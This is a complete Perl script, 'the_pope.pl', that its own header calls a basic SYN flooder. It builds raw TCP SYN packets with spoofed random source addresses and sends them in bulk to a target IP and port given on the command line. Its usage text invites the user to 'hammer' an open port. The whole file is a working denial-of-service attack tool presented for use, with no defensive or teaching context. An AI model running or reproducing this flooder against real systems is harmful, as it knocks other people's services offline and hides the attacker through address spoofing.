#!/usr/bin/perl -w

################################################################################
# the_pope.pl - 5.13.02 - v0.2                                                 #
#------------------------------------------------------------------------------#
# A basic syn flooder. Specify the host ip and the port and watch it hit the   #
# system up for all it's worth.                                                #
################################################################################

### Uses
use strict;
use Socket;
use Getopt::Long;

my %opt; GetOptions(\%opt, qw(h|help d|destination=s n|num=i p|port=i));

### Do they need help?
if($opt{'h'}) { usage(); }

### Unless we get an ip to flood they obviously don't know how to use this
if($opt{'d'} && $opt{'p'} && $opt{'n'}) {
    flood($opt{'d'}, $opt{'p'}, $opt{'n'});
} else {
    usage();
}

### Sub-routines ###############################################################

### flood: Takes the ip and port as args and proceeds to synflood them
sub flood {
    my $targetip = shift;
    my $targetport = shift;
    my $numOfPackets = shift;
    my $srcip;
    my $srcport;

### We'll be using these in a second
    my $proto_raw  = 255;
    my $proto_ip   = 0;
    my $ip_hdrincl = 1;

### I like my sockets raw thanks
    socket(S, AF_INET, SOCK_RAW, $proto_raw) or die "ERROR: $!\n";
    setsockopt(S, $proto_ip, $ip_hdrincl, 1);

### Get a packet ready
    my $data;
    my $packet;
    my ($dest) = pack('S n a4 x8', AF_INET, $targetport, $targetip);
    print "Source ip: port\t\tDestination ip: port\n";
    print "---------------\t\t--------------------\n";
    for(my $i=0; $i < $numOfPackets; $i++) {
#print ".";
	$srcip = genIp();
	$srcport = int(rand(50000)) + 1024; ### We're not coming from a priv port
	print "$srcip:$srcport\t$targetip:$targetport\n";
	$packet = gimmeAPacket($srcip, $srcport, $targetip, $targetport, $data);
	send(S, $packet, 0, $dest);
    }
    print "\n";
}

### genIp: Generates a random ip address and returns it as a string
sub genIp {
### A pseudo-random ip generator
    my $one   = int((rand(230) + rand(230)) / 2) + 20;
    my $two   = int((rand(255) + rand(255)) / 2);
    my $three = int((rand(255) + rand(255)) / 2);
    my $four  = int((rand(255) + rand(255)) / 2);

    return $one . "." . $two . "." . $three . "." . $four;
}

### gimmeAPacket: performs the tedious process of building a packet from scratch
sub gimmeAPacket {
    my($src_host, $src_port, $dest_host, $dest_port, $data) = @_;
    my $hdr_cksum = 0;
    my $zero = 0;
    my $proto_tcp = 6;
    my $tcp_length = 20;
    my $syn = 651234565;
    my $ack = 0;
    my $tcp_4bit_hdrlen = "5";
    my $tcp_4bit_reserved = 0;
    my $hdr_n_reserved = $tcp_4bit_hdrlen . $tcp_4bit_reserved;
    my $tcp_urg_bit = 0;
    my $tcp_ack_bit = 0;
    my $tcp_psh_bit = 0;
    my $tcp_rst_bit = 0;
    my $tcp_syn_bit = 1;
    my $tcp_fin_bit = 0;
    my $tcp_codebits = $zero . $zero . $tcp_urg_bit . $tcp_ack_bit . $tcp_psh_bit
	. $tcp_rst_bit . $tcp_syn_bit . $tcp_fin_bit;
    my $tcp_windowsize = 124;
    my $tcp_urgent_pointer = 0;

### Lets get the ip
    $dest_host = (gethostbyname($dest_host))[4];
    $src_host = (gethostbyname($src_host))[4];

    my ($pseudo_tcp) = pack ('a4 a4 C C
			N N N 
			N N
			H2 B8
			n v n',
			     $src_host, $dest_host, $zero, $proto_tcp,
			     $tcp_length, $src_port, $dest_port,
			     $syn, $ack,
			     $hdr_n_reserved, $tcp_codebits,
			     $tcp_windowsize, $zero, $tcp_urgent_pointer);

    my ($tcp_chksum) = checksum($pseudo_tcp);

    my $ip_version = "4";
    my $ip_hedlen = "5";
    my $ver_n_hlen = $ip_version . $ip_hedlen;
    my $ip_tos = "00";
    my $totlength = $tcp_length + 20;
    my $ip_fragment_id = 31337; ### Mad leet yo :P
    my $ip_3bit_flags = "010";
    my $ip_13bit_fragoffset = "0000000000000";
    my $ip_flags_n_frags = $ip_3bit_flags . $ip_13bit_fragoffset;
    my $ip_ttl = 64;

    my ($hdr) = pack('H2 H2 n n
			B16 C2
			n a4 a4
			n n 
			N N
			H2 B8
			n v n',
		     $ver_n_hlen, $ip_tos, $totlength, $ip_fragment_id,
		     $ip_flags_n_frags, $ip_ttl, $proto_tcp,
		     $hdr_cksum, $src_host, $dest_host,
		     $src_port, $dest_port,
		     $syn, $ack,
		     $hdr_n_reserved, $tcp_codebits,
		     $tcp_windowsize, $tcp_chksum, $tcp_urgent_pointer);
    return $hdr;
}

### checksum: calculate the tcp checksum
sub checksum {
    my ($msg) = @_;
    my ($len_msg, $num_short, $short, $chk);

    $len_msg = length($msg);
    $num_short = $len_msg / 2;
    $chk = 0;
    foreach $short (unpack("S$num_short", $msg)) {
	$chk += $short;
    }
    $chk += unpack("C", substr($msg, $len_msg - 1, 1)) if $len_msg % 2;
    $chk = ($chk >> 16) + ($chk & 0xffff);
    return(~(($chk >> 16) + $chk) & 0xffff);

}

### usage: Tells the user how to use the program
sub usage {
    die << "EOT"

      Usage: $0 -h -i <ip> -p <port>
      -h, --help:        This help menu
      -d, --destination: The ip or hostname of the system you want to flood
      -n, --num:         The number of packets to send before stopping
      -p, --port:        A port you know is open that we can hammer

EOT
}
